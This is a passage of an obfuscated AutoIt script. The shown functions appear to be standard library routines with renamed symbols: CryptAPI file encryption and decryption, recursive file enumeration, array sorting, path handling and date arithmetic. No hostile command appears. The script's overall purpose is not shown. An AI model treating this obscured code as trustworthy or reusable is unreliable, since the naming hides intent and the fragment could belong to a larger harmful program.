	If $2Y <> 0 And $33 Then DllCall(_28(), "bool", "CryptDestroyHash", "handle", $2Y)
	_1V()
	Return SetError($2S, $2T, $2Z)
EndFunc
Func _22($39, $3A, $32, $2V)
	Local $3B = 0, $3C = 0, $3D = 0, $2S = 0, $2T = 0, $3E = FileGetSize($39), $3F = 0, $3G = True
	_1U()
	Do
		If $2V <> $2M Then
			$32 = _1W($32, $2V)
			If @error Then
				$2S = @error
				$2T = @extended
				$3G = False
				ExitLoop
			EndIf
		EndIf
		$3C = FileOpen($39, $1Y)
		If @error Then
			$2S = 2
			$3G = False
			ExitLoop
		EndIf
		$3D = FileOpen($3A, $1W + $1X + $1Y)
		If @error Then
			$2S = 3
			$3G = False
			ExitLoop
		EndIf
		Do
			$3B = FileRead($3C, 1024 * 1024)
			$3F += BinaryLen($3B)
			If $3F = $3E Then
				$3B = _1Y($3B, $32, $2M, True)
				If @error Then
					$2S = @error + 400
					$2T = @extended
					$3G = False
				EndIf
				FileWrite($3D, $3B)
				ExitLoop 2
			Else
				$3B = _1Y($3B, $32, $2M, False)
				If @error Then
					$2S = @error + 500
					$2T = @extended
					$3G = False
					ExitLoop 2
				EndIf
				FileWrite($3D, $3B)
			EndIf
		Until False
	Until True
	If $2V <> $2M Then _1X($32)
	_1V()
	If $3C <> -1 Then FileClose($3C)
	If $3D <> -1 Then FileClose($3D)
	Return SetError($2S, $2T, $3G)
EndFunc
Func _23($39, $3A, $32, $2V)
	Local $3B = 0, $3C = 0, $3D = 0, $2S = 0, $2T = 0, $3E = FileGetSize($39), $3F = 0, $3G = True
	_1U()
	Do
		If $2V <> $2M Then
			$32 = _1W($32, $2V)
			If @error Then
				$2S = @error
				$2T = @extended
				$3G = False
				ExitLoop
			EndIf
		EndIf
		$3C = FileOpen($39, $1Y)
		If @error Then
			$2S = 2
			$3G = False
			ExitLoop
		EndIf
		$3D = FileOpen($3A, $1W + $1X + $1Y)
		If @error Then
			$2S = 3
			$3G = False
			ExitLoop
		EndIf
		Do
			$3B = FileRead($3C, 1024 * 1024)
			$3F += BinaryLen($3B)
			If $3F = $3E Then
				$3B = _1Z($3B, $32, $2M, True)
				If @error Then
					$2S = @error + 400
					$2T = @extended
					$3G = False
				EndIf
				FileWrite($3D, $3B)
				ExitLoop 2
			Else
				$3B = _1Z($3B, $32, $2M, False)
				If @error Then
					$2S = @error + 500
					$2T = @extended
					$3G = False
					ExitLoop 2
				EndIf
				FileWrite($3D, $3B)
			EndIf
		Until False
	Until True
	If $2V <> $2M Then _1X($32)
	_1V()
	If $3C <> -1 Then FileClose($3C)
	If $3D <> -1 Then FileClose($3D)
	Return SetError($2S, $2T, $3G)
EndFunc
Func _25()
	Return $2O[0]
EndFunc
Func _26()
	$2O[0] += 1
EndFunc
Func _27()
	If $2O[0] > 0 Then $2O[0] -= 1
EndFunc
Func _28()
	Return $2O[1]
EndFunc
Func _29($2P)
	$2O[1] = $2P
EndFunc
Func _2A()
	Return $2O[2]
EndFunc
Func _2B($3H)
	$2O[2] = $3H
EndFunc
Func _2C($32)
	Local $3I = DllStructCreate("uint;dword")
	DllStructSetData($3I, 2, 4)
	Local $2R = DllCall(_28(), "bool", "CryptGetKeyParam", "handle", $32, "dword", $2N, "ptr", DllStructGetPtr($3I, 1), "dword*", DllStructGetPtr($3I, 2), "dword", 0)
	If @error Or Not $2R[0] Then
		Return SetError(@error, @extended, $2I)
	Else
		Return DllStructGetData($3I, 1)
	EndIf
EndFunc
Global Const $3J = 0
Global Const $3K = 1
Global Const $3L = 2
Global Const $3M = 2
Global Const $3N = 1
Global Const $3O = 2
Func _2I(ByRef $3P, Const ByRef $3Q, $3R = 0)
	If $3R = Default Then $3R = 0
	If Not IsArray($3P) Then Return SetError(1, 0, -1)
	If Not IsArray($3Q) Then Return SetError(2, 0, -1)
	Local $3S = UBound($3P, $3J)
	Local $3T = UBound($3Q, $3J)
	Local $3U = UBound($3P, $3K)
	Local $3V = UBound($3Q, $3K)
	If $3R < 0 Or $3R > $3V - 1 Then Return SetError(6, 0, -1)
	Switch $3S
		Case 1
			If $3T <> 1 Then Return SetError(4, 0, -1)
			ReDim $3P[$3U + $3V - $3R]
			For $18 = $3R To $3V - 1
				$3P[$3U + $18 - $3R] = $3Q[$18]
			Next
		Case 2
			If $3T <> 2 Then Return SetError(4, 0, -1)
			Local $3W = UBound($3P, $3L)
			If UBound($3Q, $3L) <> $3W Then Return SetError(5, 0, -1)
			ReDim $3P[$3U + $3V - $3R][$3W]
			For $18 = $3R To $3V - 1
				For $3X = 0 To $3W - 1
					$3P[$3U + $18 - $3R][$3X] = $3Q[$18][$3X]
				Next
			Next
		Case Else
			Return SetError(3, 0, -1)
	EndSwitch
	Return UBound($3P, $3K)
EndFunc
Func _31(ByRef $3Y, $3Z, $40, $41 = True)
	If $3Z > $40 Then Return
	Local $42 = $40 - $3Z + 1
	Local $18, $3X, $43, $44, $45, $46, $47, $48
	If $42 < 45 Then
		If $41 Then
			$18 = $3Z
			While $18 < $40
				$3X = $18
				$44 = $3Y[$18 + 1]
				While $44 < $3Y[$3X]
					$3Y[$3X + 1] = $3Y[$3X]
					$3X -= 1
					If $3X + 1 = $3Z Then ExitLoop
				WEnd
				$3Y[$3X + 1] = $44
				$18 += 1
			WEnd
		Else
			While 1
				If $3Z >= $40 Then Return 1
				$3Z += 1
				If $3Y[$3Z] < $3Y[$3Z - 1] Then ExitLoop
			WEnd
			While 1
				$43 = $3Z
				$3Z += 1
				If $3Z > $40 Then ExitLoop
				$46 = $3Y[$43]
				$47 = $3Y[$3Z]
				If $46 < $47 Then
					$47 = $46
					$46 = $3Y[$3Z]
				EndIf
				$43 -= 1
				While $46 < $3Y[$43]
					$3Y[$43 + 2] = $3Y[$43]
					$43 -= 1
				WEnd
				$3Y[$43 + 2] = $46
				While $47 < $3Y[$43]
					$3Y[$43 + 1] = $3Y[$43]
					$43 -= 1
				WEnd
				$3Y[$43 + 1] = $47
				$3Z += 1
			WEnd
			$48 = $3Y[$40]
			$40 -= 1
			While $48 < $3Y[$40]
				$3Y[$40 + 1] = $3Y[$40]
				$40 -= 1
			WEnd
			$3Y[$40 + 1] = $48
		EndIf
		Return 1
	EndIf
	Local $49 = BitShift($42, 3) + BitShift($42, 6) + 1
	Local $4A, $4B, $4C, $4D, $4E, $4F
	$4C = Ceiling(($3Z + $40) / 2)
	$4B = $4C - $49
	$4A = $4B - $49
	$4D = $4C + $49
	$4E = $4D + $49
	If $3Y[$4B] < $3Y[$4A] Then
		$4F = $3Y[$4B]
		$3Y[$4B] = $3Y[$4A]
		$3Y[$4A] = $4F
	EndIf
	If $3Y[$4C] < $3Y[$4B] Then
		$4F = $3Y[$4C]
		$3Y[$4C] = $3Y[$4B]
		$3Y[$4B] = $4F
		If $4F < $3Y[$4A] Then
			$3Y[$4B] = $3Y[$4A]
			$3Y[$4A] = $4F
		EndIf
	EndIf
	If $3Y[$4D] < $3Y[$4C] Then
		$4F = $3Y[$4D]
		$3Y[$4D] = $3Y[$4C]
		$3Y[$4C] = $4F
		If $4F < $3Y[$4B] Then
			$3Y[$4C] = $3Y[$4B]
			$3Y[$4B] = $4F
			If $4F < $3Y[$4A] Then
				$3Y[$4B] = $3Y[$4A]
				$3Y[$4A] = $4F
			EndIf
		EndIf
	EndIf
	If $3Y[$4E] < $3Y[$4D] Then
		$4F = $3Y[$4E]
		$3Y[$4E] = $3Y[$4D]
		$3Y[$4D] = $4F
		If $4F < $3Y[$4C] Then
			$3Y[$4D] = $3Y[$4C]
			$3Y[$4C] = $4F
			If $4F < $3Y[$4B] Then
				$3Y[$4C] = $3Y[$4B]
				$3Y[$4B] = $4F
				If $4F < $3Y[$4A] Then
					$3Y[$4B] = $3Y[$4A]
					$3Y[$4A] = $4F
				EndIf
			EndIf
		EndIf
	EndIf
	Local $4G = $3Z
	Local $4H = $40
	If (($3Y[$4A] <> $3Y[$4B]) And ($3Y[$4B] <> $3Y[$4C]) And ($3Y[$4C] <> $3Y[$4D]) And ($3Y[$4D] <> $3Y[$4E])) Then
		Local $4I = $3Y[$4B]
		Local $4J = $3Y[$4D]
		$3Y[$4B] = $3Y[$3Z]
		$3Y[$4D] = $3Y[$40]
		Do
			$4G += 1
		Until $3Y[$4G] >= $4I
		Do
			$4H -= 1
		Until $3Y[$4H] <= $4J
		$43 = $4G
		While $43 <= $4H
			$45 = $3Y[$43]
			If $45 < $4I Then
				$3Y[$43] = $3Y[$4G]
				$3Y[$4G] = $45
				$4G += 1
			ElseIf $45 > $4J Then
				While $3Y[$4H] > $4J
					$4H -= 1
					If $4H + 1 = $43 Then ExitLoop 2
				WEnd
				If $3Y[$4H] < $4I Then
					$3Y[$43] = $3Y[$4G]
					$3Y[$4G] = $3Y[$4H]
					$4G += 1
				Else
					$3Y[$43] = $3Y[$4H]
				EndIf
				$3Y[$4H] = $45
				$4H -= 1
			EndIf
			$43 += 1
		WEnd
		$3Y[$3Z] = $3Y[$4G - 1]
		$3Y[$4G - 1] = $4I
		$3Y[$40] = $3Y[$4H + 1]
		$3Y[$4H + 1] = $4J
		_31($3Y, $3Z, $4G - 2, True)
		_31($3Y, $4H + 2, $40, False)
		If ($4G < $4A) And ($4E < $4H) Then
			While $3Y[$4G] = $4I
				$4G += 1
			WEnd
			While $3Y[$4H] = $4J
				$4H -= 1
			WEnd
			$43 = $4G
			While $43 <= $4H
				$45 = $3Y[$43]
				If $45 = $4I Then
					$3Y[$43] = $3Y[$4G]
					$3Y[$4G] = $45
					$4G += 1
				ElseIf $45 = $4J Then
					While $3Y[$4H] = $4J
						$4H -= 1
						If $4H + 1 = $43 Then ExitLoop 2
					WEnd
					If $3Y[$4H] = $4I Then
						$3Y[$43] = $3Y[$4G]
						$3Y[$4G] = $4I
						$4G += 1
					Else
						$3Y[$43] = $3Y[$4H]
					EndIf
					$3Y[$4H] = $45
					$4H -= 1
				EndIf
				$43 += 1
			WEnd
		EndIf
		_31($3Y, $4G, $4H, False)
	Else
		Local $4K = $3Y[$4C]
		$43 = $4G
		While $43 <= $4H
			If $3Y[$43] = $4K Then
				$43 += 1
				ContinueLoop
			EndIf
			$45 = $3Y[$43]
			If $45 < $4K Then
				$3Y[$43] = $3Y[$4G]
				$3Y[$4G] = $45
				$4G += 1
			Else
				While $3Y[$4H] > $4K
					$4H -= 1
				WEnd
				If $3Y[$4H] < $4K Then
					$3Y[$43] = $3Y[$4G]
					$3Y[$4G] = $3Y[$4H]
					$4G += 1
				Else
					$3Y[$43] = $4K
				EndIf
				$3Y[$4H] = $45
				$4H -= 1
			EndIf
			$43 += 1
		WEnd
		_31($3Y, $3Z, $4G - 1, True)
		_31($3Y, $4H + 1, $40, False)
	EndIf
EndFunc
Func _3J($4L, $4M = "*", $4N = $27, $4O = False)
	Local $4P = "|", $4Q = "", $4R = "", $4S = ""
	$4L = StringRegExpReplace($4L, "[\\/]+$", "") & "\"
	If $4N = Default Then $4N = $27
	If $4O Then $4S = $4L
	If $4M = Default Then $4M = "*"
	If Not FileExists($4L) Then Return SetError(1, 0, 0)
	If StringRegExp($4M, "[\\/:><\|]|(?s)^\s*$") Then Return SetError(2, 0, 0)
	If Not ($4N = 0 Or $4N = 1 Or $4N = 2) Then Return SetError(3, 0, 0)
	Local $4T = FileFindFirstFile($4L & $4M)
	If @error Then Return SetError(4, 0, 0)
	While 1
		$4R = FileFindNextFile($4T)
		If @error Then ExitLoop
		If ($4N + @extended = 2) Then ContinueLoop
		$4Q &= $4P & $4S & $4R
	WEnd
	FileClose($4T)
	If $4Q = "" Then Return SetError(4, 0, 0)
	Return StringSplit(StringTrimLeft($4Q, 1), $4P)
EndFunc
Func _3K($4L, $4U = "*", $4V = $29, $4W = $2A, $4X = $2B, $4Y = $2C)
	If Not FileExists($4L) Then Return SetError(1, 1, "")
	If $4U = Default Then $4U = "*"
	If $4V = Default Then $4V = $29
	If $4W = Default Then $4W = $2A
	If $4X = Default Then $4X = $2B
	If $4Y = Default Then $4Y = $2C
	If $4W > 1 Or Not IsInt($4W) Then Return SetError(1, 6, "")
	Local $4Z = False
	If StringLeft($4L, 4) == "\\?\" Then
		$4Z = True
	EndIf
	Local $50 = ""
	If StringRight($4L, 1) = "\" Then
		$50 = "\"
	Else
		$4L = $4L & "\"
	EndIf
	Local $51[100] = [1]
	$51[1] = $4L
	Local $52 = 0, $53 = ""
	If BitAND($4V, 4) Then
		$52 += 2
		$53 &= "H"
		$4V -= 4
	EndIf
	If BitAND($4V, 8) Then
		$52 += 4
		$53 &= "S"
		$4V -= 8
	EndIf
	Local $54 = 0
	If BitAND($4V, 16) Then
		$54 = 1024
		$4V -= 16
	EndIf
	Local $55 = 0
	If $4W < 0 Then
		StringReplace($4L, "\", "", 0, $3M)
		$55 = @extended - $4W
	EndIf
	Local $56 = "", $57 = "", $58 = "*"
	Local $59 = StringSplit($4U, "|")
	Switch $59[0]
		Case 3
			$57 = $59[3]
			ContinueCase
		Case 2
			$56 = $59[2]
			ContinueCase
		Case 1
			$58 = $59[1]
	EndSwitch
	Local $5A = ".+"
	If $58 <> "*" Then
		If Not _3N($5A, $58) Then Return SetError(1, 2, "")
	EndIf
	Local $5B = ".+"
	Switch $4V
		Case 0
			Switch $4W
				Case 0
					$5B = $5A
			EndSwitch
		Case 2
			$5B = $5A
	EndSwitch
	Local $5C = ":"
	If $56 <> "" Then
		If Not _3N($5C, $56) Then Return SetError(1, 3, "")
	EndIf
	Local $5D = ":"
	If $4W Then
		If $57 Then
			If Not _3N($5D, $57) Then Return SetError(1, 4, "")
		EndIf
		If $4V = 2 Then
			$5D = $5C
		EndIf
	Else
		$5D = $5C
	EndIf
	If Not ($4V = 0 Or $4V = 1 Or $4V = 2) Then Return SetError(1, 5, "")
	If Not ($4X = 0 Or $4X = 1 Or $4X = 2) Then Return SetError(1, 7, "")
	If Not ($4Y = 0 Or $4Y = 1 Or $4Y = 2) Then Return SetError(1, 8, "")
	If $54 Then
		Local $5E = DllStructCreate("struct;align 4;dword FileAttributes;uint64 CreationTime;uint64 LastAccessTime;uint64 LastWriteTime;" & "dword FileSizeHigh;dword FileSizeLow;dword Reserved0;dword Reserved1;wchar FileName[260];wchar AlternateFileName[14];endstruct")
		Local $5F = DllOpen("kernel32.dll"), $5G
	EndIf
	Local $5H[100] = [0]
	Local $5I = $5H, $5J = $5H, $5K = $5H
	Local $5L = False, $4T = 0, $5M = "", $5N = "", $5O = ""
	Local $5P = 0, $5Q = ""
	Local $5R[100][2] = [[0, 0]]
	While $51[0] > 0
		$5M = $51[$51[0]]
		$51[0] -= 1
		Switch $4Y
			Case 1
				$5O = StringReplace($5M, $4L, "")
			Case 2
				If $4Z Then
					$5O = StringTrimLeft($5M, 4)
				Else
					$5O = $5M
				EndIf
		EndSwitch
		If $54 Then
			$5G = DllCall($5F, "handle", "FindFirstFileW", "wstr", $5M & "*", "struct*", $5E)
			If @error Or Not $5G[0] Then
				ContinueLoop
			EndIf
			$4T = $5G[0]
		Else
			$4T = FileFindFirstFile($5M & "*")
			If $4T = -1 Then
				ContinueLoop
			EndIf
		EndIf
		If $4V = 0 And $4X And $4Y Then
			_3M($5R, $5O, $5I[0] + 1)
		EndIf
		$5Q = ""
		While 1
			If $54 Then
				$5G = DllCall($5F, "int", "FindNextFileW", "handle", $4T, "struct*", $5E)
				If @error Or Not $5G[0] Then
					ExitLoop
				EndIf
				$5N = DllStructGetData($5E, "FileName")
				If $5N = ".." Then
					ContinueLoop
				EndIf
				$5P = DllStructGetData($5E, "FileAttributes")
				If $52 And BitAND($5P, $52) Then
					ContinueLoop
				EndIf
				If BitAND($5P, $54) Then
					ContinueLoop
				EndIf
				$5L = False
				If BitAND($5P, 16) Then
					$5L = True
				EndIf
			Else
				$5L = False
				$5N = FileFindNextFile($4T, 1)
				If @error Then
					ExitLoop
				EndIf
				$5Q = @extended
				If StringInStr($5Q, "D") Then
					$5L = True
				EndIf
				If StringRegExp($5Q, "[" & $53 & "]") Then
					ContinueLoop
				EndIf
			EndIf
			If $5L Then
				Select
					Case $4W < 0
						StringReplace($5M, "\", "", 0, $3M)
						If @extended < $55 Then
							ContinueCase
						EndIf
					Case $4W = 1
						If Not StringRegExp($5N, $5D) Then
							_3M($51, $5M & $5N & "\")
						EndIf
				EndSelect
			EndIf
			If $4X Then
				If $5L Then
					If StringRegExp($5N, $5B) And Not StringRegExp($5N, $5D) Then
						_3M($5K, $5O & $5N & $50)
					EndIf
				Else
					If StringRegExp($5N, $5A) And Not StringRegExp($5N, $5C) Then
						If $5M = $4L Then
							_3M($5J, $5O & $5N)
						Else
							_3M($5I, $5O & $5N)
						EndIf
					EndIf
				EndIf
			Else
				If $5L Then
					If $4V <> 1 And StringRegExp($5N, $5B) And Not StringRegExp($5N, $5D) Then
						_3M($5H, $5O & $5N & $50)
					EndIf
				Else
					If $4V <> 2 And StringRegExp($5N, $5A) And Not StringRegExp($5N, $5C) Then
						_3M($5H, $5O & $5N)
					EndIf
				EndIf
			EndIf
		WEnd
		If $54 Then
			DllCall($5F, "int", "FindClose", "ptr", $4T)
		Else
			FileClose($4T)
		EndIf
	WEnd
	If $54 Then
		DllClose($5F)
	EndIf
	If $4X Then
		Switch $4V
			Case 2
				If $5K[0] = 0 Then Return SetError(1, 9, "")
				ReDim $5K[$5K[0] + 1]
				$5H = $5K
				_31($5H, 1, $5H[0])
			Case 1
				If $5J[0] = 0 And $5I[0] = 0 Then Return SetError(1, 9, "")
				If $4Y = 0 Then
					_3L($5H, $5J, $5I)
					_31($5H, 1, $5H[0])
				Else
					_3L($5H, $5J, $5I, 1)
				EndIf
			Case 0
				If $5J[0] = 0 And $5K[0] = 0 Then Return SetError(1, 9, "")
				If $4Y = 0 Then
					_3L($5H, $5J, $5I)
					$5H[0] += $5K[0]
					ReDim $5K[$5K[0] + 1]
					_2I($5H, $5K, 1)
					_31($5H, 1, $5H[0])
				Else
					Local $5H[$5I[0] + $5J[0] + $5K[0] + 1]
					$5H[0] = $5I[0] + $5J[0] + $5K[0]
					_31($5J, 1, $5J[0])
					For $18 = 1 To $5J[0]
						$5H[$18] = $5J[$18]
					Next
					Local $5S = $5J[0] + 1
					_31($5K, 1, $5K[0])
					Local $5T = ""
					For $18 = 1 To $5K[0]
						$5H[$5S] = $5K[$18]
						$5S += 1
						If $50 Then
							$5T = $5K[$18]
						Else
							$5T = $5K[$18] & "\"
						EndIf
						Local $5U = 0, $5V = 0
						For $3X = 1 To $5R[0][0]
							If $5T = $5R[$3X][0] Then
								$5V = $5R[$3X][1]
								If $3X = $5R[0][0] Then
									$5U = $5I[0]
								Else
									$5U = $5R[$3X + 1][1] - 1
								EndIf
								If $4X = 1 Then
									_31($5I, $5V, $5U)
								EndIf
								For $43 = $5V To $5U
									$5H[$5S] = $5I[$43]
									$5S += 1
								Next
								ExitLoop
							EndIf
						Next
					Next
				EndIf
		EndSwitch
	Else
		If $5H[0] = 0 Then Return SetError(1, 9, "")
		ReDim $5H[$5H[0] + 1]
	EndIf
	Return $5H
EndFunc
Func _3L(ByRef $5W, $5X, $5Y, $4X = 0)
	ReDim $5X[$5X[0] + 1]
	If $4X = 1 Then _31($5X, 1, $5X[0])
	$5W = $5X
	$5W[0] += $5Y[0]
	ReDim $5Y[$5Y[0] + 1]
	If $4X = 1 Then _31($5Y, 1, $5Y[0])
	_2I($5W, $5Y, 1)
EndFunc
Func _3M(ByRef $5Z, $60, $61 = -1)
	If $61 = -1 Then
		$5Z[0] += 1
		If UBound($5Z) <= $5Z[0] Then ReDim $5Z[UBound($5Z) * 2]
		$5Z[$5Z[0]] = $60
	Else
		$5Z[0][0] += 1
		If UBound($5Z) <= $5Z[0][0] Then ReDim $5Z[UBound($5Z) * 2][2]
		$5Z[$5Z[0][0]][0] = $60
		$5Z[$5Z[0][0]][1] = $61
	EndIf
EndFunc
Func _3N(ByRef $4U, $62)
	If StringRegExp($62, "\\|/|:|\<|\>|\|") Then Return 0
	$62 = StringReplace(StringStripWS(StringRegExpReplace($62, "\s*;\s*", ";"), $3N + $3O), ";", "|")
	$62 = StringReplace(StringReplace(StringRegExpReplace($62, "[][$^.{}()+\-]", "\\$0"), "?", "."), "*", ".*?")
	$4U = "(?i)^(" & $62 & ")\z"
	Return 1
EndFunc
Func _3S($4L, $63, $64, $65 = False)
	If $63 <= 0 Then Return SetError(4, 0, 0)
	If Not IsString($64) Then
		$64 = String($64)
		If $64 = "" Then Return SetError(6, 0, 0)
	EndIf
	If $65 = Default Then $65 = False
	If Not (IsBool($65) Or $65 = 0 Or $65 = 1) Then Return SetError(5, 0, 0)
	If Not FileExists($4L) Then Return SetError(2, 0, 0)
	Local $3Y = FILEREADTOARRAY($4L)
	Local $66 = UBound($3Y) - 1
	If ($66 + 1) < $63 Then Return SetError(1, 0, 0)
	Local $67 = FileOpen($4L, FileGetEncoding($4L) + $1W)
	If $67 = -1 Then Return SetError(3, 0, 0)
	Local $68 = ""
	$63 -= 1
	For $18 = 0 To $66
		If $18 = $63 Then
			If $65 Then
				If $64 Then $68 &= $64 & @CRLF
			Else
				$68 &= $64 & @CRLF & $3Y[$18] & @CRLF
			EndIf
		ElseIf $18 < $66 Then
			$68 &= $3Y[$18] & @CRLF
		ElseIf $18 = $66 Then
			$68 &= $3Y[$18]
		EndIf
	Next
	FileWrite($67, $68)
	FileClose($67)
	Return 1
EndFunc
Func _3T($69, $6A = @WorkingDir)
	If Not $69 Or $69 = "." Then Return $6A
	Local $4S = StringReplace($69, "/", "\")
	Local Const $6B = $4S
	Local $6C
	Local $6D = StringLeft($4S, 1) = "\" And StringMid($4S, 2, 1) <> "\"
	If $6A = Default Then $6A = @WorkingDir
	For $18 = 1 To 2
		$6C = StringLeft($4S, 2)
		If $6C = "\\" Then
			$4S = StringTrimLeft($4S, 2)
			Local $6E = StringInStr($4S, "\") - 1
			$6C = "\\" & StringLeft($4S, $6E)
			$4S = StringTrimLeft($4S, $6E)
			ExitLoop
		ElseIf StringRight($6C, 1) = ":" Then
			$4S = StringTrimLeft($4S, 2)
			ExitLoop
		Else
			$4S = $6A & "\" & $4S
		EndIf
	Next
	If StringLeft($4S, 1) <> "\" Then
		If StringLeft($6B, 2) = StringLeft($6A, 2) Then
			$4S = $6A & "\" & $4S
		Else
			$4S = "\" & $4S
		EndIf
	EndIf
	Local $6F = StringSplit($4S, "\")
	Local $6G[$6F[0]], $3X = 0
	For $18 = 2 To $6F[0]
		If $6F[$18] = ".." Then
			If $3X Then $3X -= 1
		ElseIf Not ($6F[$18] = "" And $18 <> $6F[0]) And $6F[$18] <> "." Then
			$6G[$3X] = $6F[$18]
			$3X += 1
		EndIf
	Next
	$4S = $6C
	If Not $6D Then
		For $18 = 0 To $3X - 1
			$4S &= "\" & $6G[$18]
		Next
	Else
		$4S &= $6B
		If StringInStr($4S, "..") Then $4S = _3T($4S)
	EndIf
	Do
		$4S = StringReplace($4S, ".\", "\")
	Until @extended = 0
	Return $4S
EndFunc
Global Const $6H = Ptr(-1)
Global Const $6I = Ptr(-1)
Global Const $6J = 256
Global Const $6K = 8192
Global Const $6L = 32768
Global Const $6M = BitShift($6J, 8)
Global Const $6N = BitShift($6K, 8)
Global Const $6O = BitShift($6L, 8)
Func _48($6P)
	Local $6 = DllCall("kernel32.dll", "bool", "CloseHandle", "handle", $6P)
	If @error Then Return SetError(@error, @extended, False)
	Return $6[0]
EndFunc
Func _65($6Q)
	Local $6 = DllCall("kernel32.dll", "bool", "GetFileSizeEx", "handle", $6Q, "int64*", 0)
	If @error Or Not $6[0] Then Return SetError(@error, @extended, -1)
	Return $6[2]
EndFunc
Func _8M($6Q)
	Local $6 = DllCall("kernel32.dll", "bool", "SetEndOfFile", "handle", $6Q)
	If @error Then Return SetError(@error, @extended, False)
	Return $6[0]
EndFunc
Func _9N($6Q, $6R, $6S, ByRef $6T, $6U = 0)
	Local $6 = DllCall("kernel32.dll", "bool", "WriteFile", "handle", $6Q, "struct*", $6R, "dword", $6S, "dword*", 0, "struct*", $6U)
	If @error Then Return SetError(@error, @extended, False)
	$6T = $6[4]
	Return $6[0]
EndFunc
Global Const $6V = "struct;dword OSVersionInfoSize;dword MajorVersion;dword MinorVersion;dword BuildNumber;dword PlatformId;wchar CSDVersion[128];endstruct"
Global Const $6W = _AO()
Func _AO()
	Local $6X = DllStructCreate($6V)
	DllStructSetData($6X, 1, DllStructGetSize($6X))
	Local $2R = DllCall("kernel32.dll", "bool", "GetVersionExW", "struct*", $6X)
	If @error Or Not $2R[0] Then Return SetError(@error, @extended, 0)
	Return BitOR(BitShift(DllStructGetData($6X, 2), -8), DllStructGetData($6X, 3))
EndFunc
Func _BH($6Y, $6Z, $70)
	Local $71[4]
	Local $72[4]
	Local $73
	$6Y = StringLeft($6Y, 1)
	If StringInStr("D,M,Y,w,h,n,s", $6Y) = 0 Or $6Y = "" Then
		Return SetError(1, 0, 0)
	EndIf
	If Not StringIsInt($6Z) Then
		Return SetError(2, 0, 0)
	EndIf
	If Not _BN($70) Then
		Return SetError(3, 0, 0)
	EndIf
	_BW($70, $72, $71)
	If $6Y = "d" Or $6Y = "w" Then
		If $6Y = "w" Then $6Z = $6Z * 7
		$73 = _BZ($72[1], $72[2], $72[3]) + $6Z
		_C1($73, $72[1], $72[2], $72[3])
	EndIf
	If $6Y = "m" Then
		$72[2] = $72[2] + $6Z
		While $72[2] > 12
			$72[2] = $72[2] - 12
			$72[1] = $72[1] + 1
		WEnd
		While $72[2] < 1
			$72[2] = $72[2] + 12
			$72[1] = $72[1] - 1
		WEnd
	EndIf
	If $6Y = "y" Then
		$72[1] = $72[1] + $6Z
	EndIf
	If $6Y = "h" Or $6Y = "n" Or $6Y = "s" Then
		Local $74 = _CC($71[1], $71[2], $71[3]) / 1000
		If $6Y = "h" Then $74 = $74 + $6Z * 3600
		If $6Y = "n" Then $74 = $74 + $6Z * 60
		If $6Y = "s" Then $74 = $74 + $6Z
		Local $75 = Int($74 / (24 * 60 * 60))
		$74 = $74 - $75 * 24 * 60 * 60
		If $74 < 0 Then
			$75 = $75 - 1
			$74 = $74 + 24 * 60 * 60
		EndIf
		$73 = _BZ($72[1], $72[2], $72[3]) + $75
		_C1($73, $72[1], $72[2], $72[3])
		_CB($74 * 1000, $71[1], $71[2], $71[3])
	EndIf
	Local $76 = _CF($72[1])
	If $76[$72[2]] < $72[3] Then $72[3] = $76[$72[2]]
	$70 = $72[1] & "/" & StringRight("0" & $72[2], 2) & "/" & StringRight("0" & $72[3], 2)
	If $71[0] > 0 Then
		If $71[0] > 2 Then
			$70 = $70 & " " & StringRight("0" & $71[1], 2) & ":" & StringRight("0" & $71[2], 2) & ":" & StringRight("0" & $71[3], 2)
		Else
			$70 = $70 & " " & StringRight("0" & $71[1], 2) & ":" & StringRight("0" & $71[2], 2)
		EndIf
	EndIf
	Return $70
EndFunc
Func _BK($6Y, $77, $78)
	$6Y = StringLeft($6Y, 1)
	If StringInStr("d,m,y,w,h,n,s", $6Y) = 0 Or $6Y = "" Then
		Return SetError(1, 0, 0)
	EndIf
	If Not _BN($77) Then
		Return SetError(2, 0, 0)
	EndIf
	If Not _BN($78) Then
		Return SetError(3, 0, 0)
	EndIf
	Local $79[4], $7A[4], $7B[4], $7C[4]
	_BW($77, $79, $7A)
	_BW($78, $7B, $7C)
	Local $7D = _BZ($7B[1], $7B[2], $7B[3]) - _BZ($79[1], $79[2], $79[3])
	Local $7E, $7F, $7G, $7H
	If $7A[0] > 1 And $7C[0] > 1 Then
		$7G = $7A[1] * 3600 + $7A[2] * 60 + $7A[3]
		$7H = $7C[1] * 3600 + $7C[2] * 60 + $7C[3]
		$7E = $7H - $7G
		If $7E < 0 Then
			$7D = $7D - 1
			$7E = $7E + 24 * 60 * 60
		EndIf
	Else
		$7E = 0
	EndIf
	Select
		Case $6Y = "d"
			Return $7D
		Case $6Y = "m"
			$7F = $7B[1] - $79[1]
			Local $7I = $7B[2] - $79[2] + $7F * 12
			If $7B[3] < $79[3] Then $7I = $7I - 1
			$7G = $7A[1] * 3600 + $7A[2] * 60 + $7A[3]
			$7H = $7C[1] * 3600 + $7C[2] * 60 + $7C[3]
			$7E = $7H - $7G
			If $7B[3] = $79[3] And $7E < 0 Then $7I = $7I - 1
			Return $7I
		Case $6Y = "y"
			$7F = $7B[1] - $79[1]
			If $7B[2] < $79[2] Then $7F = $7F - 1
			If $7B[2] = $79[2] And $7B[3] < $79[3] Then $7F = $7F - 1
			$7G = $7A[1] * 3600 + $7A[2] * 60 + $7A[3]
			$7H = $7C[1] * 3600 + $7C[2] * 60 + $7C[3]
			$7E = $7H - $7G
			If $7B[2] = $79[2] And $7B[3] = $79[3] And $7E < 0 Then $7F = $7F - 1
			Return $7F
		Case $6Y = "w"
			Return Int($7D / 7)
		Case $6Y = "h"
			Return $7D * 24 + Int($7E / 3600)
		Case $6Y = "n"
			Return $7D * 24 * 60 + Int($7E / 60)
		Case $6Y = "s"
			Return $7D * 24 * 60 * 60 + $7E
	EndSelect
EndFunc
Func _BL($7J)
	If StringIsInt($7J) Then
		Select
			Case Mod($7J, 4) = 0 And Mod($7J, 100) <> 0
				Return 1
			Case Mod($7J, 400) = 0
				Return 1
			Case Else
				Return 0
		EndSelect
	EndIf
	Return SetError(1, 0, 0)
EndFunc
Func _BN($70)
	Local $72[4], $71[4]
	_BW($70, $72, $71)
	If Not StringIsInt($72[1]) Then Return 0
	If Not StringIsInt($72[2]) Then Return 0
	If Not StringIsInt($72[3]) Then Return 0
	$72[1] = Int($72[1])
	$72[2] = Int($72[2])
	$72[3] = Int($72[3])
	Local $76 = _CF($72[1])
	If $72[1] < 1000 Or $72[1] > 2999 Then Return 0
	If $72[2] < 1 Or $72[2] > 12 Then Return 0
